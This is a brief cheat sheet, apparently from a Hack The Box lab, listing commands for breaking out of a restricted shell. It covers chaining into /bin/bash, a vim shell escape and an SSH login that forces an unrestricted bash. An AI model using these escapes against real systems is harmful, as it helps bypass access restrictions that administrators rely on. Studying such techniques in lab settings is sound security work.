# Restricted Shell
```powershell
echo $SHELL
echo $0
echo $PATH

echo /home/htb-user/bin/*
ls | /bin/bash
ls ; /bin/bash

Method 1:
vim
:set shell=/bin/bash
:shell

ssh htb-user@10.129.16.44 -t "bash --noprofile"
```
